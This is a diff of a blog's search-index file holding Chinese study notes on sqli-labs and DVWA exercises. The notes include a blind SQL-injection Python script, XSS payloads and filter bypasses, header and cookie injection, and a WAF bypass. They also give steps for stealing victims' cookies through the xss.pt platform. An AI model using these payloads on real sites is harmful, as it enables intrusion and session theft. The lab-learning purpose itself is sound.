-<p>def db_length(url,str):<br>    print(“[-]开始测试数据库名长度…….”)<br>    num=1<br>    while True:<br>        db_payload=url+”‘ and (length(database())=%d)–+”%num<br>        r=requests.get(db_payload)<br>        if str in r.text:<br>            db_length=num<br>            print(“[+]数据库长度：%d\n”%db_length)<br>            break<br>        else:<br>            num += 1</p>
-<p><code>if __name__ == &#39;__main__&#39;:</code><br>    url=”<a href="http://localhost1/Less-5/?id=1&quot;#%E7%9B%AE%E6%A0%87url">http://localhost1/Less-5/?id=1&quot;#目标url</a><br>    str=”You are in”#布尔型盲注的true&amp;false的判断因素<br>    db_length(url,str)#程序入口`<br><img src="/2021/01/16/python/1.png"></p>
+<h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>查看源码，代码直接引用name参数，且没有进行过滤和检查，存在明显的XSS漏洞。<br>输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br><img src="/2021/01/08/xss/1.png"></p>
+<h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><p>多了str_replace函数，把<code>&lt;script&gt;</code>过滤了。<br>方法一：双写绕过。<code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code><br>方法二：大小写绕过。<code>&lt;SCRipt&gt;alert(/xss/)&lt;/script&gt;</code></p>
+<h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><p>preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。<br>正则表达式很强大。<br><code>&lt;img src=1 onerror=alert(/xss/)&gt;</code><br>所以这里无法通过<code>&lt;script&gt;</code>标签注入XSS代码了，但是可以找img，body等标签的事件或者iframe等标签的src注入恶意的js代码。</p>
+<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><p>了解三个函数，有的是之前见过了，再复习一下。<br>trim(string,charlist)<br>函数移除字符串两侧的空白字符或其他预定字符，如\t,\n,\x0B\r以及空格，可选参数charlist支持添加额外需要删除的字符。<br>mysql_real_escape_string(string,connection)函数会对字符串中的特殊符号(\x00,\n,\r,’,”,\x1a)进行转义。<br>stripslashes(string)<br>函数删除字符串中的反斜杠。<br>这里没有对XXS方面进行过滤和检查，且存储在数据库中，明显存在存储型XSS漏洞。<br>方法一：尝试在name端输入，有字数限制，可以抓包修改上传。<br>方法二：直接在message内输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>name里随便输入就行，成功出现弹窗。</p>
+<h4 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h4><p>这里无法对message参数进行注入，message被htmlspecialchars函数进行编码，但是name只简单进行了<code>&lt;script&gt;</code>过滤，所以<br>抓包后，双写，或者大小写绕过。</p>
+<h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><p>message还是被htmlspecialchars函数进行编码，name使用了正则表达式替换，所以可以同上面反射型方法一样，对其他标签注入。<br>抓包下来，该name参数为<code>&lt;img src=1 onerror=alert(1)&gt;</code>即可。</p>
+<h3 id="dom"><a href="#dom" class="headerlink" title="dom"></a>dom</h3><h4 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h4><p>查看源码，php内没任何东西，可以进行任意操作。直接在payload上输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>,成功弹窗。<br><img src="/2021/01/08/xss/2.png"></p>
+<h4 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h4><p>Stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。<br>检测default值中是否有 &lt;script  ，如果有的话，则将 default=English ,就不能双写，大小写绕过了。<br>这里通过img标签注入，输入<code>&lt;img src=1 onerror=alert(1)&gt;</code>，没有出现弹窗，检查页面源代码。<br><img src="/2021/01/08/xss/3.png"><br>语句被插入了value，但没有插入到option，所以img标签没有起到作用，这里闭合option标签。<br>原理：<code>&lt;option value=&#39;     &quot; + lang + &quot;      &#39;&gt;  &quot;  + decodeURI(lang) +  &quot;  &lt;/option&gt;</code><br>所以构造，<code>&gt;&lt;/option&gt;&lt;img src=1 οnerrοr=alert(1)&gt; </code><br><img src="/2021/01/08/xss/4.png"><br>只有&gt;插入，option标签的值，因为闭合了option标签，所以img标签并没有插入。<br>继续构造闭合select标签，这样img标签就是独立的一条语句。<code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</code><br>成功插入页面。<br>![](xss.md/5.png<br>补充：<br>基本payload：<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><code>&lt;body onload=alert(1)&gt;</code><br><code>&lt;input onclick=alert(1)&gt;</code><br><code>&lt;img src=1 onerror=alert(1)&gt;</code><br><code>&lt;a href=javascript:alert(1)&gt;</code></p>
+<h3 id="XSSER的使用步骤"><a href="#XSSER的使用步骤" class="headerlink" title="XSSER的使用步骤"></a>XSSER的使用步骤</h3><p>网站：<a href="https://xss.pt/xss.php?do=login">https://xss.pt/xss.php?do=login</a><br>1、登陆，创建项目，默认，keep。<br>2、拷贝代码，植入。<br>3、在XSSER框架等待受害者的Cookie。<br>4、攻击者浏览项目，便可获得受害者会话信息。<br>5、把Cookie值全部填入Cookie-editor或者使用burp修改Cookie值。</p>
 ]]></content>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
   </entry>
   <entry>
     <title>web</title>
@@ -1938,26 +1958,6 @@ EOF;
 ]]></content>
       <tags>
         <tag>一句话木马</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS</title>
-    <url>/2021/01/08/xss/</url>
-    <content><![CDATA[<p><strong>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上是一种注入攻击，<br>是指黑客在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在浏览器执行，如获取用户cookie信息。<br>需要强调的是，XSS不仅仅限制于JavaScript，还包括flash等其他脚本语言。<br>根据恶意代码是否存储在服务器中，XSS可分为存储型XSS和反射型XSS。</strong></p>
-<span id="more"></span>
-
-<h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>查看源码，代码直接引用name参数，且没有进行过滤和检查，存在明显的XSS漏洞。<br>输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br><img src="/2021/01/08/xss/1.png"></p>
-<h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><p>多了str_replace函数，把<code>&lt;script&gt;</code>过滤了。<br>方法一：双写绕过。<code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code><br>方法二：大小写绕过。<code>&lt;SCRipt&gt;alert(/xss/)&lt;/script&gt;</code></p>
-<h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><p>preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。<br>正则表达式很强大。<br><code>&lt;img src=1 onerror=alert(/xss/)&gt;</code><br>所以这里无法通过<code>&lt;script&gt;</code>标签注入XSS代码了，但是可以找img，body等标签的事件或者iframe等标签的src注入恶意的js代码。</p>
-<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><p>了解三个函数，有的是之前见过了，再复习一下。<br>trim(string,charlist)<br>函数移除字符串两侧的空白字符或其他预定字符，如\t,\n,\x0B\r以及空格，可选参数charlist支持添加额外需要删除的字符。<br>mysql_real_escape_string(string,connection)函数会对字符串中的特殊符号(\x00,\n,\r,’,”,\x1a)进行转义。<br>stripslashes(string)<br>函数删除字符串中的反斜杠。<br>这里没有对XXS方面进行过滤和检查，且存储在数据库中，明显存在存储型XSS漏洞。<br>方法一：尝试在name端输入，有字数限制，可以抓包修改上传。<br>方法二：直接在message内输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>name里随便输入就行，成功出现弹窗。</p>
-<h4 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h4><p>这里无法对message参数进行注入，message被htmlspecialchars函数进行编码，但是name只简单进行了<code>&lt;script&gt;</code>过滤，所以<br>抓包后，双写，或者大小写绕过。</p>
-<h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><p>message还是被htmlspecialchars函数进行编码，name使用了正则表达式替换，所以可以同上面反射型方法一样，对其他标签注入。<br>抓包下来，该name参数为<code>&lt;img src=1 onerror=alert(1)&gt;</code>即可。</p>
-<h3 id="dom"><a href="#dom" class="headerlink" title="dom"></a>dom</h3><h4 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h4><p>查看源码，php内没任何东西，可以进行任意操作。直接在payload上输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>,成功弹窗。<br><img src="/2021/01/08/xss/2.png"></p>
-<h4 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h4><p>Stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。<br>检测default值中是否有 &lt;script  ，如果有的话，则将 default=English ,就不能双写，大小写绕过了。<br>这里通过img标签注入，输入<code>&lt;img src=1 onerror=alert(1)&gt;</code>，没有出现弹窗，检查页面源代码。<br><img src="/2021/01/08/xss/3.png"><br>语句被插入了value，但没有插入到option，所以img标签没有起到作用，这里闭合option标签。<br>原理：<code>&lt;option value=&#39;     &quot; + lang + &quot;      &#39;&gt;  &quot;  + decodeURI(lang) +  &quot;  &lt;/option&gt;</code><br>所以构造，<code>&gt;&lt;/option&gt;&lt;img src=1 οnerrοr=alert(1)&gt; </code><br><img src="/2021/01/08/xss/4.png"><br>只有&gt;插入，option标签的值，因为闭合了option标签，所以img标签并没有插入。<br>继续构造闭合select标签，这样img标签就是独立的一条语句。<code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</code><br>成功插入页面。<br>![](xss.md/5.png<br>补充：<br>基本payload：<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><code>&lt;body onload=alert(1)&gt;</code><br><code>&lt;input onclick=alert(1)&gt;</code><br><code>&lt;img src=1 onerror=alert(1)&gt;</code><br><code>&lt;a href=javascript:alert(1)&gt;</code></p>
-<h3 id="XSSER的使用步骤"><a href="#XSSER的使用步骤" class="headerlink" title="XSSER的使用步骤"></a>XSSER的使用步骤</h3><p>网站：<a href="https://xss.pt/xss.php?do=login">https://xss.pt/xss.php?do=login</a><br>1、登陆，创建项目，默认，keep。<br>2、拷贝代码，植入。<br>3、在XSSER框架等待受害者的Cookie。<br>4、攻击者浏览项目，便可获得受害者会话信息。<br>5、把Cookie值全部填入Cookie-editor或者使用burp修改Cookie值。</p>
-]]></content>
-      <tags>
-        <tag>XSS</tag>
       </tags>
   </entry>
   <entry>
@@ -2052,39 +2052,6 @@ EOF;
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs18、19、20</title>
-    <url>/2020/12/04/sqli-labs/18~19/</url>
-    <content><![CDATA[<h3 id="头部注入"><a href="#头部注入" class="headerlink" title="头部注入"></a>头部注入</h3><p><strong>usename，password被过滤了</strong></p>
-<span id="more"></span>
-
-<pre><code>无法通过注入usename，password获取信息/*对用户名和密码进行过滤 */
-</code></pre>
-<p><img src="/2020/12/04/sqli-labs/18~19/0.png"><br>    分析源码发现有insert语句，将uagent，ip，$uname，插入数据库，uname无法注入，从其他两个下手。</p>
-<h4 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h4><pre><code>$_SERVER是一个包含头信息、路径以及脚本位置等等信息的数组，由web服务器创建，不能保证每个服务器都提高全部项目。
-注意: PHP 5.4.0 之前，$HTTP_SERVER_VARS 包含着相同的信息，但它不是一个超全局变量。 
-(注意 $HTTP_SERVER_VARS 与 $_SERVER 是不同的变量，PHP处理它们的方式不同)
-$_SERVER[‘HTTP_USER_AGENT’] //当前请求的 User_Agent: 头部的内容。
-$_SERVER[‘REMOTE_ADDR’] //当前用户 IP 。
-对于ip和urgent没有被过滤，可以注入。
-User-Agent:浏览器的用户代理字符串。
-在user-agent中输入以下语句时：&#39;单引号报错  &#39;#单引号加注释报错 &#39;and &#39;1&#39;=&#39;1 单引号+and+等式，正常显示。利用burp抓包修改，
-`User-Agent: &#39; and extractvalue(1,concat(0x7e,(select version()),0x7e)) and&#39;1&#39;=&#39;1`其他的数据也可爆出。
-Referer:发出请求的页面的URI。
-学会看源码
-* 补充一下，之前都报错不出来，原来是账户密码登陆错误，要登陆才能进行注入。
-* 因为在源码sql语句中user-agent处后台已经加了单引号，在报错时记得加and&#39;进行闭合，不然报不出结果。
-</code></pre>
-<h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p><strong>第一步：登陆，成功登陆。</strong></p>
-<p>在user-agent构造payload<br><img src="/2020/12/04/sqli-labs/18~19/1.png"><br>奇怪了为什么报错语句不行？看了大佬博客原因在：源码中语句：<br><img src="/2020/12/04/sqli-labs/18~19/2.png"><br>uagent是在IP和uname之前的，如果注释掉后面的语句，会直接导致Insert语句直接异常，达不到我们查询的目的，<br>所以改成<br><img src="/2020/12/04/sqli-labs/18~19/3.png"><br>成功。</p>
-<h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>改成在referer构造payload。<br><img src="/2020/12/04/sqli-labs/18~19/4.png"><br>其他不再赘述。</p>
-<h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>同样uname和passwd都被过滤了，而cookie没有，直接可以获取。我们先了解一下什么是</p>
-<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie:"></a>Cookie:</h4><p>Cookie，有时也用其复数形式 Cookies。<br>类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息。<br>查看为单引号闭合性，使用一下联合查询语句，即可。<br><code>uname=1&#39; union select 1,2,3#</code><br><img src="/2020/12/04/sqli-labs/18~19/5.png"><br>爆库<br><code>uname=1&#39; union select 1,2,database()#</code><br><img src="/2020/12/04/sqli-labs/18~19/6.png"><br>剩下的可以都可以爆出。</p>
-]]></content>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-labs11~16</title>
     <url>/2020/12/03/sqli-labs/11~16/</url>
     <content><![CDATA[<h3 id="POST-型注入"><a href="#POST-型注入" class="headerlink" title="POST 型注入"></a>POST 型注入</h3><p>一般存在搜索框或登入页面位置</p>
@@ -2113,6 +2080,39 @@ Referer:发出请求的页面的URI。
 <h4 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h4><pre><code>这次要换个思路了，在uname无法注入，查看码源，只有uname被过滤，试一下password回显正常。
 </code></pre>
 <p><img src="/2020/12/03/sqli-labs/11~16/1.5.png"><br>    uname要输入本来就有的用户，一般用admin。<br>    password：<code>1&#39; and updatexml(1,concat(0x7c,database()),1)#</code> 用报错注入即可，联合注入不行。<br><img src="/2020/12/03/sqli-labs/11~16/2.png"></p>
+]]></content>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs18、19、20</title>
+    <url>/2020/12/04/sqli-labs/18~19/</url>
+    <content><![CDATA[<h3 id="头部注入"><a href="#头部注入" class="headerlink" title="头部注入"></a>头部注入</h3><p><strong>usename，password被过滤了</strong></p>
+<span id="more"></span>
+
+<pre><code>无法通过注入usename，password获取信息/*对用户名和密码进行过滤 */
+</code></pre>
+<p><img src="/2020/12/04/sqli-labs/18~19/0.png"><br>    分析源码发现有insert语句，将uagent，ip，$uname，插入数据库，uname无法注入，从其他两个下手。</p>
+<h4 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h4><pre><code>$_SERVER是一个包含头信息、路径以及脚本位置等等信息的数组，由web服务器创建，不能保证每个服务器都提高全部项目。
+注意: PHP 5.4.0 之前，$HTTP_SERVER_VARS 包含着相同的信息，但它不是一个超全局变量。 
+(注意 $HTTP_SERVER_VARS 与 $_SERVER 是不同的变量，PHP处理它们的方式不同)
+$_SERVER[‘HTTP_USER_AGENT’] //当前请求的 User_Agent: 头部的内容。
+$_SERVER[‘REMOTE_ADDR’] //当前用户 IP 。
+对于ip和urgent没有被过滤，可以注入。
+User-Agent:浏览器的用户代理字符串。
+在user-agent中输入以下语句时：&#39;单引号报错  &#39;#单引号加注释报错 &#39;and &#39;1&#39;=&#39;1 单引号+and+等式，正常显示。利用burp抓包修改，
+`User-Agent: &#39; and extractvalue(1,concat(0x7e,(select version()),0x7e)) and&#39;1&#39;=&#39;1`其他的数据也可爆出。
+Referer:发出请求的页面的URI。
+学会看源码
+* 补充一下，之前都报错不出来，原来是账户密码登陆错误，要登陆才能进行注入。
+* 因为在源码sql语句中user-agent处后台已经加了单引号，在报错时记得加and&#39;进行闭合，不然报不出结果。
+</code></pre>
+<h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p><strong>第一步：登陆，成功登陆。</strong></p>
+<p>在user-agent构造payload<br><img src="/2020/12/04/sqli-labs/18~19/1.png"><br>奇怪了为什么报错语句不行？看了大佬博客原因在：源码中语句：<br><img src="/2020/12/04/sqli-labs/18~19/2.png"><br>uagent是在IP和uname之前的，如果注释掉后面的语句，会直接导致Insert语句直接异常，达不到我们查询的目的，<br>所以改成<br><img src="/2020/12/04/sqli-labs/18~19/3.png"><br>成功。</p>
+<h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>改成在referer构造payload。<br><img src="/2020/12/04/sqli-labs/18~19/4.png"><br>其他不再赘述。</p>
+<h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>同样uname和passwd都被过滤了，而cookie没有，直接可以获取。我们先了解一下什么是</p>
+<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie:"></a>Cookie:</h4><p>Cookie，有时也用其复数形式 Cookies。<br>类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息。<br>查看为单引号闭合性，使用一下联合查询语句，即可。<br><code>uname=1&#39; union select 1,2,3#</code><br><img src="/2020/12/04/sqli-labs/18~19/5.png"><br>爆库<br><code>uname=1&#39; union select 1,2,database()#</code><br><img src="/2020/12/04/sqli-labs/18~19/6.png"><br>剩下的可以都可以爆出。</p>
 ]]></content>
       <tags>
         <tag>SQL注入</tag>
@@ -2218,6 +2218,21 @@ Referer:发出请求的页面的URI。
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs29~31</title>
+    <url>/2020/12/12/sqli-labs/29/</url>
+    <content><![CDATA[<p>这三关我都试了一下联合查询注入，都可以过。跟前三关一模一样，它的防火墙呢？不知道想考什么？<br>看了大佬博客，是双服务器问题，我这里就没有安装tomcat的服务，直接学习一下大佬的文章。</p>
+<span id="more"></span>
+
+<h3 id="补充一下知识点："><a href="#补充一下知识点：" class="headerlink" title="补充一下知识点："></a>补充一下知识点：</h3><p><strong>服务器有两个部分</strong><br>第一部分为 tomcat 为引擎的 jsp 型服务器<br>第二部分为 apache 为引擎的 php 服务器<br>真正为web服务的是php。<br>试了几个版本，也不行。<br>查看源码。又有一个login.php<br>这一关还要自己构造防御。<br>在源码加入login.php即可.<br>输入<code>login.php?id=1</code>出现<br>说明参数被waf挡住了，我们需要在构造一个参数。<br><code>?id=1&amp;id=1--+</code>成功绕过waf。</p>
+<h3 id="测试注入点"><a href="#测试注入点" class="headerlink" title="测试注入点"></a>测试注入点</h3><p><strong>尝试单引号和双引号都不报错，再接下来尝试两种就可以判断是单引号闭合型，双引号会被认做两个单引号就形成闭合了，导致不好判断。</strong><br>还有这里只能使用&amp;其他的行不通。为什么呢？</p>
+<h3 id="30"><a href="#30" class="headerlink" title="30"></a>30</h3><p>改成”即可。</p>
+<h3 id="31"><a href="#31" class="headerlink" title="31"></a>31</h3><p>改成”)即可。</p>
+]]></content>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs32~35</title>
     <url>/2020/12/12/sqli-labs/32/</url>
     <content><![CDATA[<h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>宽字节注入</p>
@@ -2228,21 +2243,6 @@ Referer:发出请求的页面的URI。
 <h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>post型<br>正常登入，本题也是宽字节注入。<br>这题不是get型，不是以URL形式提交的？其实还是差不多的。<br>但是直接在页面输入，怎么试都错误，应该是post型提交有不一样。打开burp抓包<br>果然%被转义成%25，在burp换成%即可。</p>
 <h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><p>定型：为含addslashes数字型注入。<br>基本和第二关差不多了。<br>**但是特别注意有引号的，’security’要变成16进制，这是MySQL本身支持的查询方式，也就不需要用到单引号了。</p>
 <h3 id="Less-36-amp-amp-Less-37"><a href="#Less-36-amp-amp-Less-37" class="headerlink" title="Less-36&amp;&amp;Less-37"></a>Less-36&amp;&amp;Less-37</h3><p>也是宽字节注入，加入%df和/组成一个字符。</p>
-]]></content>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs29~31</title>
-    <url>/2020/12/12/sqli-labs/29/</url>
-    <content><![CDATA[<p>这三关我都试了一下联合查询注入，都可以过。跟前三关一模一样，它的防火墙呢？不知道想考什么？<br>看了大佬博客，是双服务器问题，我这里就没有安装tomcat的服务，直接学习一下大佬的文章。</p>
-<span id="more"></span>
-
-<h3 id="补充一下知识点："><a href="#补充一下知识点：" class="headerlink" title="补充一下知识点："></a>补充一下知识点：</h3><p><strong>服务器有两个部分</strong><br>第一部分为 tomcat 为引擎的 jsp 型服务器<br>第二部分为 apache 为引擎的 php 服务器<br>真正为web服务的是php。<br>试了几个版本，也不行。<br>查看源码。又有一个login.php<br>这一关还要自己构造防御。<br>在源码加入login.php即可.<br>输入<code>login.php?id=1</code>出现<br>说明参数被waf挡住了，我们需要在构造一个参数。<br><code>?id=1&amp;id=1--+</code>成功绕过waf。</p>
-<h3 id="测试注入点"><a href="#测试注入点" class="headerlink" title="测试注入点"></a>测试注入点</h3><p><strong>尝试单引号和双引号都不报错，再接下来尝试两种就可以判断是单引号闭合型，双引号会被认做两个单引号就形成闭合了，导致不好判断。</strong><br>还有这里只能使用&amp;其他的行不通。为什么呢？</p>
-<h3 id="30"><a href="#30" class="headerlink" title="30"></a>30</h3><p>改成”即可。</p>
-<h3 id="31"><a href="#31" class="headerlink" title="31"></a>31</h3><p>改成”)即可。</p>
 ]]></content>
       <tags>
         <tag>SQL注入</tag>
@@ -2288,101 +2288,6 @@ Referer:发出请求的页面的URI。
 <h4 id="判断是否存在sql注入"><a href="#判断是否存在sql注入" class="headerlink" title="判断是否存在sql注入"></a>判断是否存在sql注入</h4><p>最经典的：<strong>加单引号</strong>，无论是字符型还是数字型都会报错，页面显示异常。<br>字符型：通过and’1’=’1 和and’1’=’2<br>如果第一个页面显示正常，第二个无正常显示，则存在字符型sql注入，因为sql语句可以被执行，程序没有对敏感字符过滤。<br>数字型：1=1 和1=2进行判断，同上。</p>
 <h4 id="注入手法"><a href="#注入手法" class="headerlink" title="注入手法"></a>注入手法</h4><p>工具注入：最省力，sqlmap可以快速爆出数据，但缺点是大多数时候即使存在sql注入，也爆不出来。<br>还有写python盲注脚本。<br><strong>手工注入：联合查询注入<br>    报错注入(三种方法)<br>    盲注(布尔盲注，时间盲注)<br>    堆叠注入(加;再多构造一句sql语句注入)<br>    二次注入(通过创建同名加特殊字符加过滤实现对原用户的密码进行修改)利用相关修改密码sql语句。<br>    双写大小写绕过注入<br>    写入一句话木马<br>    双服务器过滤(通过&amp;再构造一个参数绕过)<br>    宽字节注入</strong><br><em>这里只是一个大概，感觉刷靶场花费的时间感觉还是太长，没有适应这种学习方式，也仅仅是刚刚开始，希望后续的学习能逐渐提高…</em> 
     </p>
-]]></content>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mysql2</title>
-    <url>/2020/11/08/sqli-labs/mysql2/</url>
-    <content><![CDATA[<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><span id="more"></span>
-
-
-<h4 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h4><table>
-<thead>
-<tr>
-<th>类型</th>
-<th align="right">大小</th>
-<th align="center">用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>tinyint</td>
-<td align="right">1字节</td>
-<td align="center">小整数值</td>
-</tr>
-<tr>
-<td>smallint</td>
-<td align="right">2</td>
-<td align="center">大整数值</td>
-</tr>
-<tr>
-<td>mediumint</td>
-<td align="right">3</td>
-<td align="center">大整数值</td>
-</tr>
-<tr>
-<td>int</td>
-<td align="right">4</td>
-<td align="center">大整数值</td>
-</tr>
-<tr>
-<td>bigint</td>
-<td align="right">8</td>
-<td align="center">极大整数值</td>
-</tr>
-<tr>
-<td>float</td>
-<td align="right">4</td>
-<td align="center">单精度浮点数值</td>
-</tr>
-<tr>
-<td>double</td>
-<td align="right">8</td>
-<td align="center">双精度浮点数值</td>
-</tr>
-</tbody></table>
-<h4 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h4><table>
-<thead>
-<tr>
-<th>类型</th>
-<th>格式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>date</td>
-<td>YYYY-MM-DD</td>
-</tr>
-<tr>
-<td>time</td>
-<td>xx：xx：xx</td>
-</tr>
-<tr>
-<td>year</td>
-<td>xxx</td>
-</tr>
-</tbody></table>
-<h4 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h4><table>
-<thead>
-<tr>
-<th>类型</th>
-<th>用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>char</td>
-<td>定长字符串</td>
-</tr>
-<tr>
-<td>varchar</td>
-<td>变长字符串</td>
-</tr>
-<tr>
-<td>text</td>
-<td>长文本数据</td>
-</tr>
-</tbody></table>
 ]]></content>
       <tags>
         <tag>SQL注入</tag>
@@ -2516,6 +2421,136 @@ Referer:发出请求的页面的URI。
       </tags>
   </entry>
   <entry>
+    <title>mysql2</title>
+    <url>/2020/11/08/sqli-labs/mysql2/</url>
+    <content><![CDATA[<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><span id="more"></span>
+
+
+<h4 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h4><table>
+<thead>
+<tr>
+<th>类型</th>
+<th align="right">大小</th>
+<th align="center">用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>tinyint</td>
+<td align="right">1字节</td>
+<td align="center">小整数值</td>
+</tr>
+<tr>
+<td>smallint</td>
+<td align="right">2</td>
+<td align="center">大整数值</td>
+</tr>
+<tr>
+<td>mediumint</td>
+<td align="right">3</td>
+<td align="center">大整数值</td>
+</tr>
+<tr>
+<td>int</td>
+<td align="right">4</td>
+<td align="center">大整数值</td>
+</tr>
+<tr>
+<td>bigint</td>
+<td align="right">8</td>
+<td align="center">极大整数值</td>
+</tr>
+<tr>
+<td>float</td>
+<td align="right">4</td>
+<td align="center">单精度浮点数值</td>
+</tr>
+<tr>
+<td>double</td>
+<td align="right">8</td>
+<td align="center">双精度浮点数值</td>
+</tr>
+</tbody></table>
+<h4 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h4><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>date</td>
+<td>YYYY-MM-DD</td>
+</tr>
+<tr>
+<td>time</td>
+<td>xx：xx：xx</td>
+</tr>
+<tr>
+<td>year</td>
+<td>xxx</td>
+</tr>
+</tbody></table>
+<h4 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h4><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>char</td>
+<td>定长字符串</td>
+</tr>
+<tr>
+<td>varchar</td>
+<td>变长字符串</td>
+</tr>
+<tr>
+<td>text</td>
+<td>长文本数据</td>
+</tr>
+</tbody></table>
+]]></content>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mysql3</title>
+    <url>/2020/11/11/sqli-labs/mysql3/</url>
+    <content><![CDATA[<h2 id="mysql插入数据"><a href="#mysql插入数据" class="headerlink" title="mysql插入数据"></a>mysql插入数据</h2><p><code>insert into 表名(名称1，-，-)</code><br><code>values</code><br><code>(插入的数据);</code></p>
+<span id="more"></span>
+
+<h2 id="mysql读取数据"><a href="#mysql读取数据" class="headerlink" title="mysql读取数据"></a>mysql读取数据</h2><p><code>select * from 数据表名</code><br>或<code>select 表中字段名 from 表名</code></p>
+<h2 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h2><p><code>update 表名 set 名称=新数据;</code></p>
+<h2 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h2><p><code>delete from 表名 where 名称=数据;</code></p>
